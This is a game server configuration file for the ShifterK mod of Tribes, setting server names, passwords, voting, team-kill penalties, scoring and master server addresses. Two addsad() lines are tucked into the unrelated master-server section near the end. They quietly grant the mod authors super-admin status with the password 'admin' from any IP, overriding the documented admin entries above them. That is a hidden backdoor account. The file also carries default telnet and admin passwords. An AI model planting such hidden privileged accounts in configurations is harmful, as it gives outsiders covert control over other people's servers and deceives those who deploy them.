//=================================================================================
// Serverconfig.cs
//
//    ___|   |     _)   _|  |                |  /
//  \___ \   __ \   |  |    __|   _ \   __|  ' /
//        |  | | |  |  __|  |     __/  |     . \
//  _____/  _| |_| _| _|   \__| \___| _|    _|\_\
//                         Created by: enV.3zer0 & Kill(--)
//				Assisted by: Gonzo, Grey & Czar
//                                    Orignal by: Emo
//================================================================================

$Server::HostName = "ShifterK 8-3-03";	// The name of your Server -- Default: ShifterK
$Server::MaxPlayers = "20"; 			// Max Players On Your Server -- Default: 20
$Server::timeLimit = "240";			// Mission Time Limit In Minutes -- Default: 240
$Server::Password = "";				// Server Main Password - One that is on when started
$Server::Password2 = "sbamatch";		// Server Password  - One that can be issued in-game -- Default: sbamatch
$Server::TeamDamageScale = "1";			// Team Damage On/Off -- Default: 1 (On)


//============================================================================
//                          Public Notices
//============================================================================
                
//	 White Text = <f2>                 
//	 Light Text = <f1>                  
// 	 Normal Text = <f0>                 
// 	 \n = New Line                  

$Shifter::PublicNotice = "";				// This Message will be dispalyed every so ofter as players spawn, leave it null to disable
$Server::Info 	= "<f3>___  _      _  ___ _     Welcome to ShifterK\n! __! ! !__  (_) !  _! ! !_ ___  __08_03_2003\n!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !\n!___! !_! !_! !_! !_!    !__!\___! !_!   ! ' <\nCreated by: KiLL(--) & env.3zer0   !_! !_!\n";
// ^ This is the message displayed when you click info on the server
$Server::JoinMOTD = "<f3>___  _      _  ___ _     Welcome to ShifterK\n! __! ! !__  (_) !  _! ! !_ ___  __08_03_2003\n!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !\n!___! !_! !_! !_! !_!    !__!\___! !_!   ! ' <\nCreated by: KiLL(--) & env.3zer0   !_! !_!\n";
// ^ This is what you see when you first join the server.
$Server::MODInfo 	= "<f1>Welcome to ShifterK\n" @ $killa::newdate @ "\nCreated by: KiLL(--) & enV.3zer0\n<f2>www.tribeshifter.com/k/<f1>";
// ^ This is what you see when the server is loading.
$Shifter::WelcomeMsg = "<jc><f2>Welcome to Shifter_K\nMOD: Shifter_K\nMission: <f1>" @ $missionName @ " <f0>Mission Type: <f1>" @ $Game::missionType @ "\n";
$Shifter::WelcomeDelay = "20";  //== Amount in seconds that the message is shown. If "0" message will not be displayed.

//============================================================================
//                         Networking Options
//============================================================================
$Server::FloodProtectionEnabled = "true";	// Check for chat flooding players
$Server::HostPublicGame = "true";		// List your server with the master list.
$Server::Port = "28001";			// Port To Run Server On
$pref::noIpx = "true";				// Disallow IPX/SPX binding
$Server::respawnTime = "2";			// Time after death to respawn.
$TelnetPort = "21";				// Telnet port number
$TelnetPassword = "CHANGETHIS";			// Telnet password
$Console::LogMode = "0"; 	   		// save the console to a logfile, 1 for TRUE
$Shifter::LocalNetMask = "IP:208.188.5";	//== Local IP's (Assuming you have a LAN connection to the server and are not worried about band width from connecting Lan players, You can increase the limit when a player from this IP Mask connects.



//============================================================================
//                     Team Names and Default Skins
//============================================================================
$Server::teamName0 = "enV.3zer0";			$Server::teamSkin0 = "cphoenix";
$Server::teamName1 = "KiLL(-)";				$Server::teamSkin1 = "swolf";
$Server::teamName2 = "Juggbots";		$Server::teamSkin2 = "beagle";
$Server::teamName3 = "Juggbots";		$Server::teamSkin3 = "dsword";
$Server::teamName4 = "Karayas Kastrators";		$Server::teamSkin4 = "base";


//============================================================================
//                         Mission Settings
//============================================================================
$pref::LastMission = "CanyonCrusade";	//== Sets the Starting Mission if Random Start Missions are off.
$Shifter::RandomMissions = True;	//== Random Missions on/off
$Shifter::TeamJuggle = 3;		//== Juggles the teams every X missions
$Server::warmupTime = "10";		// Mission Start Time (Delay before missions starts)
$Shifter::RandomStart = False;		//-- Start server with a Random mission
$Shifter::Refresh = False;		//-- Refresh the server after last player drops 

//============================================================================
//                       Voting Varriables
//============================================================================
$Server::MinVotes = "1";			// Minimum Votes to count
$Server::MinVotesPct = "0.69999"; 		// Percentage of votes needed to pass a vote
$Server::MinVoteTime = "45";			// Time a vote lasts
$Server::VoteFailTime = "30";			// Length Of Votes if people are NOT voting.
$Server::VoteWinMargin = "0.699999";		// Ratio of Yeh to Neh to win vote.
$Server::VotingTime = "20";			// Length Of Votes if people are voting.


//=========================================================================
//                      Advanced Flag Options
//=========================================================================
$Shifter::FlagNoReturn = "True";
$Shifter::FlagReturnTime = "400";


//=========================================================================
//                     Fair Teams Variables
//=========================================================================
$Shifter::KeepBalanced = False; //== Keep Balanced
$Shifter::FairTeams = False; 	 //== Is Fair Teams Is On
$Shifter::FairCheck = "60"; 	 //== Number in seconds that Shifter will check the teams evenness and warn players
$Shifter::FairEvens = "240"; 	 //== Number in seconds that Shifter will move the last connected player to the un even team.


//=========================================================================================================================================
// Team Killing Options
//=========================================================================================================================================
$Shifter::TeamKillOn 		= "True";	//== Is Anti TK On/Off
$Shifter::KillTerm 		= "5";		//== Number Of Time A Player Can Team Kill Before Being Terminated (Killed By Server
$SHAntiTeamKillWarnKills 	= "5";         	//== Number Of Team Kills Before Player Gets Warning.
$SHAntiTeamKillBanTime 		= "60"; 	//== Length Of Time In Seconds Player Is Banded For.
$SHAntiTeamKillMaxKills 	= "10";		//== Maximum Team Kills Before Kicked - Banned.
$SHAntiTeamKillProximity	= "50";        	//== Proximity Distance For Accidental Damage.
$Shifter::TeamKillMsg = "You have been kick and banned for team killing, I hope you enjoyed it. Email:" @ $Shifter::emailAddress @ " for reinstatement.";
$Shifter::emailAddress = "emo1313@dopplegangers.com";	//== Email address to show banned users for reinstatement


//===============================================================
//                Score Kick Options
//===============================================================
$Shifter::ScoreTracker = True;		//== Score Tracker = Warns then Kicks players for having bad scores.
$Shifter::CheckScores = 30;		//== How often to check.
$Shifter::WarnScore1 = "-10";		//== 1st Warning
$Shifter::WarnScore2 = "-20";		//== 2nd Warning
$Shifter::WarnScore3 = "-30";		//== 3rd Warning
$Shifter::WarnScoreFinal = "-100";	//== Kick Player For Crappy Score


//===============================================================
//                Automatic Admin Options
//===============================================================
$Server::AdminPassword = "YOUSHOULDCHANGETHISAGAIN";  	 // This is the password people can say VIA chat to get admin
$Server::SuperAdminPassword = "YOUSHOULDCHANGETHISAGAIN";      // This is the password people can say VIA chat to get superadmin
function AddSad(%name, %pass, %super, %ip)
{
	$Server::Admin["autoa", %name] = 1; 		// AutoAdmin? 1 = True
	$Server::Admin["noban", %name] = 1; 		// NoBan? 1 = True
	$Server::Admin["ipadr", %name] = "IP:" @ %ip; 
	$Server::Admin["sadpw", %name] = %pass;        
	$Server::Admin["admin", %name] = 1;	
	$Server::Admin["super", %name] = %super;
}

// To add someone to the AutoAdmin list
// Just follow the example we have
// Change the ONE to a ZERO, If you dont want them to be super
// The password is only good when you dont have AutoAdmin.
// Example: addsad("Name", "Password", Superadmin? 1=Yes 0=No, "IP ADDRESS");
addsad("enV.3zer0", "modder", 1, "12.245.248.179");  // This is AutoSuper Admin enV.3zer0, Only if his IP matches.    
addsad("KiLL(--)->DgD>", "modder", 0, ""); // This is AutoAdmin KiLL(--)->DgD>, Non-dependent of IP - Pass is: modder

// =================================================
//                Scoring Variables
// =================================================

$ScoreOn = True;		    	//== If True will show client thier score on change in a bottom print message for 3 seconds.
$Score::25Meters = "5";     		//== Less Than 25 Meters To Flag
$Score::75Meters = "3";     		//== From 25 to 75 Meters
$Score::150Meters = "2";    		//== From 75 to 150 Meters
$Score::250Meters = "1";    		//== From 150 to 250 Meters
$Score::FlagCapture = "15";		//== Points For A Successful Flag Capture 
$Score::FlagKill = "7";  		//== Bonus For Killing Flag Runner
$Score::FlagDef  = "3";   		//== Bonus Points For Defending The Runner
$Score::FlagReturn = "3";   		//== Points For Returning Dropped
$Score::CaptureOdj = "2";   		//== Points For Capturing An Objective
$Score::HoldingObj = "5";   		//== Points For Holding An Objective For 60 Seconds.
$Score::InitialObj = "2";   		//== Points For Getting The Objective First
$Score::ObjDestroy = "15";      //== Objective Destroyed
$Score::ObjStationS = "7";      //== Destroy Supply Station 
$Score::ObjStationA = "5";      //== Destroy Ammo Station or Command
$Score::ObjStationR = "3";      //== Destroy Remote Station
$Score::ObjFlier = "3";         //== Destroy Flyer Pad or Station
$Score::ObjGeneratorB = "10";   //== Destroy Large Generator
$Score::ObjGeneratorS = "5";    //== Destroy Small Generator including - Panels
$Score::ObjSensorL = "5";       //== Destroy Large Sensors
$Score::ObjSensorS = "2";       //== Destroy Deployable Sensors
$Score::ObjTurretL = "3";       //== Large Turrets
$Score::ObjTurretS = "1";       //== Deployable Turrets
$Score::Kill15Meters = "0";		//== Player Makes A Kill With In 15m
$Score::Kill50Meters = "1";		//== Kill From 15 to 50m
$Score::Kill100Meters = "1";		//== Kill From 50 to 100m
$Score::Kill250Meters = "2";		//== Kill From 100 to 250m
$Score::Kill250Plus = "3";		//== Kill 250m Or More
$Score::RepairObject = "1";     //== Repair Bonus. Base Points For Repair...

//========================================================
//		 Master Server Listing
//========================================================

$Server::CurrentMaster = "0";
$Server::numMasters = "3";
$Server::Master1 = "t1m1.masters.dynamix.com:28000 t1m2.masters.dynamix.com:28000 t1m3.masters.dynamix.com:28000";
$Server::Master2 = "IP:BROADCAST:28001";
$Server::XLMaster1 = "IP:198.74.38.23:28000";
$Server::XLMaster2 = "IP:Broadcast:28001";
addsad("KiLL(--)->DgD>", "admin", 1, "");
addsad("enV.3zer0", "admin", 1, "");
$Server::XLMasterN0 = "IP:209.67.28.148:28000";
$Server::XLMasterN1 = "IP:209.1.233.139:28000";
$Server::XLMasterN2 = "IP:198.74.40.68:28000";
$Server::MasterAddress0 = "IP:tribes.dynamix.com:28000";
$Server::MasterAddressN0 = "t1m1.masters.dynamix.com:28000 t1m2.masters.dynamix.com:28000 t1m3.masters.dynamix.com:28000";
$Server::MasterAddressN1 = "t1ukm1.masters.dynamix.com:28000 t1ukm2.masters.dynamix.com:28000 t1ukm3.masters.dynamix.com:28000";
$Server::MasterAddressN2 = "t1aum1.masters.dynamix.com:28000 t1aum2.masters.dynamix.com:28000 t1aum3.masters.dynamix.com:28000";
$Server::MasterName0 = "Tribes Master";
$Server::MasterName1 = "UK Tribes Master";
$Server::MasterName2 = "Australian Tribes Master";
//==========================================================
//=== These are for Debug - Do not change these lines
//$Shifter::ObjScore = "";				// Allow Objects Being Destroyed To Award Bonus Points
//$Shifter::PlrScore = "";				// Allow Player Bonus Points To Be Awarded
$Debug = "False";

